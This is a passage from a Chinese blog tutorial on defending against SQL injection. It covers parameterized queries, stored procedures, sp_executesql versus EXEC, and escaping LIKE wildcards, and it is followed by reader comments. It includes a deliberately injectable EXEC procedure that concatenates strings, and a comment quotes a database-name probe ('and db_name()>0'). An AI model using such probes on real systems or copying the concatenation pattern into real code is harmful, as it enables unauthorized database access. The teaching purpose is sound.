+<p><code class="highlighter-rouge">Count++;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>b) 通过 MSSQL 2008 的新特性：表值参数，将 C#中的整个表当参数传递给存储过程，由 SQL 做逻辑处理。注意 C#中参数设置 parameter.SqlDbType = System.Data.SqlDbType.Structured;  <a href="http://www.codeproject.com/Articles/39161/C-and-Table-Value-Parameters">详细请查看……</a></p>
+
+<p>疑虑：有部份的开发人员可能会认为使用参数化查询，会让程序更不好维护，或者在实现部份功能上会非常不便，然而，使用参数化查询造成的额外开发成本，通常都远低于因为 SQL 注入攻击漏洞被发现而遭受攻击，所造成的重大损失。</p>
+
+<p>另外：想验证重用查询计划的同学，可以使用下面两段辅助语法</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p><code class="highlighter-rouge">--清空缓存的查询计划</code></p>
+
+<p><code class="highlighter-rouge">DBCC FREEPROCCACHE</code></p>
+
+<p><code class="highlighter-rouge">GO</code></p>
+
+<p><code class="highlighter-rouge">--查询缓存的查询计划</code></p>
+
+<p><code class="highlighter-rouge">SELECT</code> <code class="highlighter-rouge">stats.execution_count</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">cnt, p.size_in_bytes</code> <code class="highlighter-rouge">AS</code> ` [<code class="highlighter-rouge">size</code>], [sql].[text] ` <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">[plan_text]</code></p>
+
+<p><code class="highlighter-rouge">FROM</code> <code class="highlighter-rouge">sys.dm_exec_cached_plans p</code></p>
+
+<p><code class="highlighter-rouge">OUTER</code> <code class="highlighter-rouge">APPLY sys.dm_exec_sql_text (p.plan_handle) sql</code></p>
+
+<p><code class="highlighter-rouge">JOIN</code> <code class="highlighter-rouge">sys.dm_exec_query_stats stats</code> <code class="highlighter-rouge">ON</code> <code class="highlighter-rouge">stats.plan_handle = p.plan_handle</code></p>
+
+<p><code class="highlighter-rouge">GO</code></p>
+
+<ol>
+  <li>参数化查询示例</li>
+</ol>
+
+<p>效果如图：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922251795.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922275184.png" alt="image" title="image" /></a></p>
+
+<p>参数化关键代码：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p><code class="highlighter-rouge">Private</code> <code class="highlighter-rouge">bool</code> ` ProtectLogin(``string ` <code class="highlighter-rouge">userName,</code> <code class="highlighter-rouge">string</code> <code class="highlighter-rouge">password)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">SqlParameter[] parameters =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">SqlParameter[]</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">new</code> ` SqlParameter{ParameterName=<code class="highlighter-rouge">"@UserName"</code>,SqlDbType=SqlDbType.NVarChar,Size=10,Value=userName}, `</p>
+
+<p><code class="highlighter-rouge">new</code> ` SqlParameter{ParameterName=<code class="highlighter-rouge">"@Password"</code>,SqlDbType=SqlDbType.VarChar,Size=20,Value=password} `</p>
+
+<p><code class="highlighter-rouge">};</code></p>
+
+<p><code class="highlighter-rouge">int</code> ` count = (<code class="highlighter-rouge">int</code>)SqlHelper.Instance.ExecuteScalar `</p>
+
+<p><code class="highlighter-rouge"> (</code><code class="highlighter-rouge">"SELECT COUNT(*) FROM Login WHERE UserName=@UserName AND Password=@password"</code><code class="highlighter-rouge">, parameters); </code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">count &gt; 0 ?</code> <code class="highlighter-rouge">true</code> <code class="highlighter-rouge">:</code> ` false``; `</p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<ol>
+  <li>存储过程</li>
+</ol>
+
+<p>存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的 SQL 语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
+
+<p>优点：</p>
+
+<p>a) 安全性高，防止 SQL 注入并且可设定只有某些用户才能使用指定存储过程。</p>
+
+<p>b) 在创建时进行预编译，后续的调用不需再重新编译。</p>
+
+<p>c) 可以降低网络的通信量。存储过程方案中用传递存储过程名来代替 SQL 语句。</p>
+
+<p>缺点：</p>
+
+<p>a) 非应用程序内联代码，调式麻烦。</p>
+
+<p>b) 修改麻烦，因为要不断的切换开发工具。（不过也有好的一面，一些易变动的规则做到存储过程中，如变动就不需要重新编译应用程序）</p>
+
+<p>c) 如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难（eg：没有 VS 的查询功能）。</p>
+
+<p>演示请下载示例程序，关键代码为：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p><code class="highlighter-rouge">cmd.CommandText = procName;</code> <code class="highlighter-rouge">// 传递存储过程名</code></p>
+
+<p><code class="highlighter-rouge">cmd.CommandType = CommandType.StoredProcedure;</code> <code class="highlighter-rouge">// 标识解析为存储过程</code></p>
+
+<p>如果在存储过程中 SQL 语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？</p>
+
+<p>答：MSSQL 中可以通过 EXEC 和 sp_executesql 动态执行拼接的 sql 语句，但 sp_executesql 支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用 sp_executesql 方式才能启到参数化防止 SQL 注入。</p>
+
+<p>关键代码：（详细见示例）</p>
+
+<p>a) sp_executesql</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p><code class="highlighter-rouge">CREATE</code> <code class="highlighter-rouge">PROCEDURE</code> <code class="highlighter-rouge">PROC_Login_executesql(</code></p>
+
+<p><code class="highlighter-rouge">@userNamenvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge"> @</code><code class="highlighter-rouge">password </code> <code class="highlighter-rouge">nvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge"> @</code><code class="highlighter-rouge">count </code> <code class="highlighter-rouge">int</code> <code class="highlighter-rouge">OUTPUT</code></p>
+
+<p><code class="highlighter-rouge">)</code></p>
+
+<p><code class="highlighter-rouge">AS</code></p>
+
+<p><code class="highlighter-rouge">BEGIN</code></p>
+
+<p><code class="highlighter-rouge">DECLARE</code> <code class="highlighter-rouge">@s nvarchar(1000);</code></p>
+
+<p><code class="highlighter-rouge">set</code> ` @s=N<code class="highlighter-rouge">'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password'</code>; `</p>
+
+<p><code class="highlighter-rouge">EXEC</code> ` sp_executesql @s,N<code class="highlighter-rouge">'@userName nvarchar(10),@password nvarchar(10),@count int output'</code>,@userName=@userName,@<code class="highlighter-rouge">password</code>=@<code class="highlighter-rouge">password</code>,@<code class="highlighter-rouge">count</code>=@``count ` <code class="highlighter-rouge">output</code></p>
+
+<p><code class="highlighter-rouge">END</code></p>
+
+<p>b) EXECUTE（注意 sql 中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识 sql 中的一个单引号）</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p><code class="highlighter-rouge">CREATE</code> <code class="highlighter-rouge">PROCEDURE</code> <code class="highlighter-rouge">PROC_Login_EXEC(</code></p>
+
+<p><code class="highlighter-rouge">@userNamenvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge"> @</code><code class="highlighter-rouge">password </code> ` varchar``(20) `</p>
+
+<p><code class="highlighter-rouge">)</code></p>
+
+<p><code class="highlighter-rouge">AS</code></p>
+
+<p><code class="highlighter-rouge">BEGIN</code></p>
+
+<p><code class="highlighter-rouge">DECLARE</code> <code class="highlighter-rouge">@s nvarchar(1000);</code></p>
+
+<p><code class="highlighter-rouge">set</code> ` @s=<code class="highlighter-rouge">'SELECT @count=COUNT(*) FROM Login WHERE UserName='</code>’’<code class="highlighter-rouge">+</code>CAST<code class="highlighter-rouge">(@userName ` `AS` ` NVARCHAR(10))+</code>’’<code class="highlighter-rouge">' AND Password='</code>’’<code class="highlighter-rouge">+</code>CAST<code class="highlighter-rouge">(@</code>password ` <code class="highlighter-rouge">AS</code> ` VARCHAR<code class="highlighter-rouge">(20))+</code>’’<code class="highlighter-rouge">''</code>; `</p>
+
+<p><code class="highlighter-rouge"> EXEC</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">'DECLARE @count int;' </code> ` +@s+<code class="highlighter-rouge">'select @count'</code>); `</p>
+
+<p><code class="highlighter-rouge">END</code></p>
+
+<p>注入截图如下：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922292478.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922302346.png" alt="image" title="image" /></a></p>
+
+<ol>
+  <li>专业的 SQL 注入工具及防毒软件</li>
+</ol>
+
+<p>情景 1</p>
+
+<p>A：“丫的，又中毒了……”</p>
+
+<p>B：“我看看，你这不是裸机在跑吗？”</p>
+
+<p>电脑上至少也要装一款杀毒软件或木马扫描软件，这样可以避免一些常见的侵入。比如开篇提到的 SQL 创建 windows 帐户，就会立马报出警报。</p>
+
+<p>情景 2</p>
+
+<p>A：“终于把网站做好了，太完美了，已经检查过没有漏洞了！”</p>
+
+<p>A：“网站怎么被黑了，怎么入侵的？？？”</p>
+
+<p>公司或个人有财力的话还是有必要购买一款专业 SQL 注入工具来验证下自己的网站，这些工具毕竟是专业的安全人员研发，在安全领域都有自己的独到之处。SQL 注入工具介绍：<a href="http://blog.jobbole.com/17763/">10 个 SQL 注入工具</a></p>
+
+<ol>
+  <li>额外小知识：LIKE 中的通配符</li>
+</ol>
+
+<p>尽管这个不属于 SQL 注入，但是其被恶意使用的方式是和 SQL 注入类似的。</p>
+
+<p>参考：<a href="http://losegoat.blog.163.com/blog/static/1822557200852111915785/">SQL 中通配符的使用</a></p>
+
+<p>%</p>
+
+<p>包含零个或多个字符的任意字符串。</p>
+
+<p>_</p>
+
+<p>任何单个字符。</p>
+
+<p>[]</p>
+
+<p>指定范围（例如 [a-f]）或集合（例如 [abcdef]）内的任何单个字符。</p>
+
+<p>[^]</p>
+
+<p>不在指定范围（例如 [^a - f]）或集合（例如 [^abcdef]）内的任何单个字符。</p>
+
+<p>在模糊查询 LIKE 中，对于输入数据中的通配符必须转义，否则会造成客户想查询包含这些特殊字符的数据时，这些特殊字符却被解析为通配符。不与 LIKE 一同使用的通配符将解释为常量而非模式。</p>
+
+<p><strong>注意使用通配符的索引性能问题：</strong></p>
+
+<p>a) like 的第一个字符是’%’或’_‘时，为未知字符不会使用索引, sql 会遍历全表。</p>
+
+<p>b) 若通配符放在已知字符后面，会使用索引。</p>
+
+<p>网上有这样的说法，不过我在 MSSQL 中使用 ctrl+L 执行语法查看索引使用情况却都没有使用索引，可能在别的数据库中会使用到索引吧……</p>
+
+<p>截图如下：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922313294.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922338669.png" alt="image" title="image" /></a></p>
+
+<p>有两种将通配符转义为普通字符的方法：</p>
+
+<ol>
+  <li>使用 ESCAPE 关键字定义转义符（通用）</li>
+</ol>
+
+<p>在模式中，当转义符置于通配符之前时，该通配符就解释为普通字符。例如，要搜索在任意位置包含字符串 5% 的字符串，请使用：</p>
+
+<p>WHERE ColumnA LIKE ‘%5/%%’ ESCAPE ‘/’</p>
+
+<ol>
+  <li>在方括号 ([ ]) 中只包含通配符本身，或要搜索破折号 (-) 而不是用它指定搜索范围，请将破折号指定为方括号内的第一个字符。EG：</li>
+</ol>
+
+<p>符号</p>
+
+<p>含义</p>
+
+<p>LIKE ‘5[%]’</p>
+
+<p>5%</p>
+
+<p>LIKE ‘5%’</p>
+
+<p>5 后跟 0 个或多个字符的字符串</p>
+
+<p>LIKE ‘[_]n’</p>
+
+<p>_n</p>
+
+<p>LIKE ‘_n’</p>
+
+<p>an, in, on (and so on)</p>
+
+<p>LIKE ‘[a-cdf]’</p>
+
+<p>a、b、c、d 或 f</p>
+
+<p>LIKE ‘[-acdf]’</p>
+
+<p>-、a、c、d 或 f</p>
+
+<p>LIKE ‘[ [ ]’</p>
+
+<p>[</p>
+
+<p>LIKE ‘]’</p>
+
+<p>] （右括号不需要转义）</p>
+
+<p>所以，进行过输入参数的关键字过滤后，还需要做下面转换确保 LIKE 的正确执行</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p><code class="highlighter-rouge">private</code> <code class="highlighter-rouge">static</code> <code class="highlighter-rouge">string</code> ` ConvertSqlForLike(``string ` <code class="highlighter-rouge">sql)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge"> sql = sql.Replace(</code><code class="highlighter-rouge">"["</code><code class="highlighter-rouge">, </code> ` “[[]”``); ` <code class="highlighter-rouge">// 这句话一定要在下面两个语句之前，否则作为转义符的方括号会被当作数据被再次处理</code></p>
+
+<p><code class="highlighter-rouge"> sql = sql.Replace(</code><code class="highlighter-rouge">"_"</code><code class="highlighter-rouge">, </code> ` “[_]”``); `</p>
+
+<p><code class="highlighter-rouge"> sql = sql.Replace(</code><code class="highlighter-rouge">"%"</code><code class="highlighter-rouge">, </code> ` “[%]”``); `</p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">sql;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>结束语：感谢你耐心的观看。恭喜你， SQL 安全攻防你已经入门了……</p>
+
+<p>参考文献：</p>
+
+<p><a href="http://wenku.baidu.com/view/dc6b95660b1c59eef8c7b449.html">SQL 注入天书</a></p>
+
+<p><a href="http://baike.baidu.com/view/3896.htm">(百度百科)SQL 注入</a></p>
+
+<p>扩展资料：</p>
+
+<p><a href="http://blog.csdn.net/babauyang/article/details/7714211">Sql Server 编译、重编译与执行计划重用原理</a></p>
+
+<p><a href="http://www.cnblogs.com/lzrabbit/archive/2012/04/21/2460978.html">浅析 Sql Server 参数化查询</a>-----验证了参数的类型和长度对参数化查询影响</p>
+
+<p><a href="http://wenku.baidu.com/view/9f19df7701f69e3143329421.html">Sql Server 参数化查询之<strong>where in</strong>和 like 实现详解</a></p>
+
+<p>-----讲述 6 种参数化实现方案</p>
+
+<p><a href="http://baike.baidu.com/view/53110.htm">webshell</a> -----不当小白，你必须认识的专业术语。一个用于站长管理，入侵者入侵的好工具</p>
+
+<p><a href="http://www.searchsecurity.com.cn/showcontent_2544.htm">SQL 注入技术和跨站脚本攻击的检测</a> -----讲解使用正则表达式检测注入</p>
+
+<p><a href="http://baike.baidu.com/view/50325.htm">XSS(百度百科)</a>              ——-恶意攻击者往 Web 页面里插入恶意 html 代码，当用户浏览该页之时，嵌入其中 Web 里面的 html 代码会被执行，从而达到恶意用户的特殊目的。</p>
+
+<p><a href="http://news.cnblogs.com/n/106793/">XSS 攻击实例</a>                ——-基本思路：我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个 cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。</p>
+
+<p><a href="http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html">Web 安全测试之 XSS</a></p>
+
+<p><a href="http://www.cnblogs.com/developersupport/p/WebAPI-Security.html">Web API 入门指南 - 闲话安全  </a></p>
+
+<p><a href="http://www.cnblogs.com/LittleHann/p/3735602.html">中间人攻击(MITM)姿势总结</a></p>
+
+<p><a href="http://www.cnblogs.com/vajoy/p/4176908.html">浅谈 WEB 安全性（前端向）</a></p>
+
+<p>作者：<a href="http://www.cnblogs.com/heyuquan/">滴答的雨</a><br />
+出处：<a href="http://www.cnblogs.com/heyuquan/">http://www.cnblogs.com/heyuquan/</a><br />
+本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。</p>
+
+<p>欢迎园友讨论下自己的见解，及向我推荐更好的资料。<br />
+本文如对您有帮助，还请多帮 <strong>【推荐】</strong> 下此文。<br />
+谢谢！！！  (<em>^_^</em>)<br />
+技术群：185718116（广深莞·NET 技术），欢迎你的加入<br />
+技术群：<a href="http://shang.qq.com/wpa/qunwpa?idkey=bedc1077396d17ebbb84f29e7704a63fb3da35c3b6902e537e6cf2283ccbb6d3"><img src="http://pub.idqqimg.com/wpa/images/group.png" alt="广西IT技术交流" title="广西IT技术交流" /></a>（广西 IT 技术交流），欢迎你的加入</p>
+
+<p>分类: <a href="https://www.cnblogs.com/heyuquan/category/368749.html">安全设计</a>, <a href="https://www.cnblogs.com/heyuquan/category/1378386.html">架构设计</a>, <a href="https://www.cnblogs.com/heyuquan/category/1378402.html">数据库</a></p>
+
+<p><a href="javascript:void(0);">好文要顶</a> <a href="javascript:void(0);">关注我</a> <a href="javascript:void(0);">收藏该文</a> <a href="javascript:void(0);" title="分享至新浪微博"><img src="https://common.cnblogs.com/images/icon_weibo_24.png" alt="" /></a> <a href="javascript:void(0);" title="分享至微信"><img src="https://common.cnblogs.com/images/wechat.png" alt="" /></a></p>
+
+<p><a href="https://home.cnblogs.com/u/heyuquan/"><img src="https://pic.cnblogs.com/face/u106337.jpg?id=13140010" alt="" /></a></p>
+
+<p><a href="https://home.cnblogs.com/u/heyuquan/">滴答的雨</a><br />
+<a href="https://home.cnblogs.com/u/heyuquan/followees/">关注 - 78</a><br />
+<a href="https://home.cnblogs.com/u/heyuquan/followers/">粉丝 - 2323</a></p>
+
+<p>推荐博客</p>
+
+<p><a href="javascript:void(0);">+加关注</a></p>
+
+<p><a href="javascript:void(0);">关注 【滴答的雨】</a></p>
+
+<p>257</p>
+
+<p>1</p>
+
+<p><a href="javascript:void(0);">快速评论</a>     <a href="#top">返回顶部</a></p>
+
+<p>currentDiggType = 0;</p>
+
+<p><a href="https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html">«</a> 上一篇： <a href="https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html" title="发布于 2012-09-28 18:52">博客美化：通用代码高亮插件（SyntaxHighlighter）</a><br />
+<a href="https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html">»</a> 下一篇： <a href="https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html" title="发布于 2012-11-30 11:04">（译）关于 async 与 await 的 FAQ</a></p>
+
+<p>posted on 2012-10-31 19:38 <a href="https://www.cnblogs.com/heyuquan/">滴答的雨</a> 阅读(140428) 评论(212) <a href="https://i.cnblogs.com/EditPosts.aspx?postid=2748577">编辑</a> <a href="javascript:void(0)">收藏</a></p>
+
+<p>markdown_highlight(); var allowComments = true, cb_blogId = 113108, cb_blogApp = ‘heyuquan’, cb_blogUserGuid = ‘7c8a509c-abf3-de11-ba8f-001cf0cd104b’; var cb_entryId = 2748577, cb_entryCreatedDate = ‘2012-10-31 19:38’, cb_postType = 1; loadViewCount(cb_entryId);</p>
+
+<p><a href="#!comments">&lt; Prev</a> <a href="#!comments">1</a> <a href="#!comments">2</a> <a href="#!comments">3</a> <a href="#!comments">4</a> 5</p>
+
+<p><strong>评论:</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3347124">#201 楼</a> 2016-01-13 18:01</td>
+      <td><a href="https://www.cnblogs.com/venice/">venices</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>不错，值得学习</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3366427">#202 楼</a> 2016-02-25 09:02</td>
+      <td><a href="https://home.cnblogs.com/u/897726/">RyanLe</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>楼主，你好，才开始涉及安全，请问下您这里有没有注入工具可供下载。</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3415676">#203 楼</a> 2016-04-22 21:19</td>
+      <td><a href="https://www.cnblogs.com/ITLearner-Linda/">心云 linda</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>请问这里<br />
+a) 猜测数据库名： and db_name() &gt;0 或系统表 master.dbo.sysdatabases<br />
+是怎么用 master.dbo.sysdatabases 猜数据库名的？</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3470311">#204 楼</a> 2016-07-14 20:38</td>
+      <td><a href="https://home.cnblogs.com/u/992638/">ppassion</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>博主大大你好，源码中是不包含数据库的吗，好像程序不能运行</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3499002">#205 楼</a> 2016-08-29 17:58</td>
+      <td><a href="https://www.cnblogs.com/zzry/">一百零七个</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark!</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/983981/20160629093639.png</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3527913">#206 楼</a> 2016-10-11 10:35</td>
+      <td><a href="https://www.cnblogs.com/webster1/">吴某 1</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/723162/20150212174325.png</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3535869">#207 楼</a> 2016-10-19 14:45</td>
+      <td><a href="https://home.cnblogs.com/u/896034/">浮生若梦丶丨</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>666666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3561995">#208 楼</a> 2016-11-22 11:01</td>
+      <td><a href="https://www.cnblogs.com/mingjia/">jianiu</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3790634">#209 楼</a> 2017-09-20 11:15</td>
+      <td><a href="https://www.cnblogs.com/sanfor/">浮生若梦丶丨</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>6666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/896034/20170905135439.png</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3803494">#210 楼</a> 2017-10-06 15:32</td>
+      <td><a href="https://home.cnblogs.com/u/1252222/">成长记实录</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>点错了 抱歉 手贱我</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3803495">#211 楼</a> 2017-10-06 15:32</td>
+      <td><a href="https://home.cnblogs.com/u/1252222/">成长记实录</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3905324">#212 楼</a> 3905324 2018/2/7 上午 10:55:59 2018-02-07 10:55</td>
+      <td><a href="https://www.cnblogs.com/dahuo/">暗夜苹果</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p><a href="#!comments">&lt; Prev</a> <a href="#!comments">1</a> <a href="#!comments">2</a> <a href="#!comments">3</a> <a href="#!comments">4</a> 5</p>
+
+<p>var commentManager = new blogCommentManager(); commentManager.renderComments(0);</p>
+
+<p><a href="javascript:void(0);">刷新评论</a><a href="#">刷新页面</a><a href="#top">返回顶部</a></p>
+
+<p>注册用户登录后才能发表评论，请 <a href="javascript:void(0);">登录</a> 或 <a href="javascript:void(0);">注册</a>， <a href="https://www.cnblogs.com/">访问</a> 网站首页。</p>
+
+<p><a href="http://www.ucancode.com/index.htm">【推荐】超 50 万行 VC++源码: 大型组态工控、电力仿真 CAD 与 GIS 源码库</a><br />
+<a href="https://www.jdcloud.com/cn/activity/newUser?utm_source=DMT_cnblogs&amp;utm_medium=CH&amp;utm_campaign=09vm&amp;utm_term=Virtual-Machines">【活动】京东云限时优惠 1.5 折购云主机，最高返价值 1000 元礼品！</a><br />
+<a href="https://cloud.tencent.com/act/pro/overseas?fromSource=gwzcw.2802159.2802159.2802159&amp;utm_medium=cpc&amp;utm_id=gwzcw.2802159.2802159.2802159">【推荐】腾讯云海外云服务器 1 核 2G19.8 元/月</a><br />
+<a href="https://www.ctyun.cn/activity/#/20190919?hmsr=%E5%8D%9A%E5%AE%A2%E5%9B%AD-0916-919%E6%B4%BB%E5%8A%A8&amp;hmpl=&amp;hmcu=&amp;hmkw=&amp;hmci=">【推荐】919 天翼云钜惠，全网低价，云主机 9 元轻松购</a><br />
+<a href="http://clickc.admaster.com.cn/c/a131575,b3595121,c1705,i0,m101,8a1,8b3,h">【推荐】华为云文字识别资源包重磅上市，1 元万次限时抢购</a><br />
+<a href="https://www.cnblogs.com/cmt/p/11505603.html">【福利】git pull &amp;&amp; cherry-pick 博客园&amp;华为云百万代金券</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>var googletag = googletag</td>
+      <td> </td>
+      <td>{}; googletag.cmd = googletag.cmd</td>
+      <td> </td>
+      <td>[]; googletag.cmd.push(function () { googletag.defineSlot(“/1090369/C1”, [300, 250], “div-gpt-ad-1546353474406-0”).addService(googletag.pubads()); googletag.defineSlot(“/1090369/C2”, [468, 60], “div-gpt-ad-1539008685004-0”).addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>相关博文：</strong><br />
+· <a href="https://www.cnblogs.com/caoyan/archive/2012/12/01/SQL注入攻防入门详解.html" title="SQL注入攻防入门详解">SQL 注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/jiangu66/p/3206821.html" title="SQL注入浅水攻防">SQL 注入浅水攻防</a><br />
+· <a href="https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html" title="SQL注入攻防入门详解">SQL 注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/bily101/archive/2013/05/03/3055745.html" title="SQL注入攻防入门详解">SQL 注入攻防入门详解</a><br />
+· <a href="https://www.cnblogs.com/chorrysky/archive/2013/02/22/2922034.html" title="SQL注入攻防入门详解">SQL 注入攻防入门详解</a></p>
+
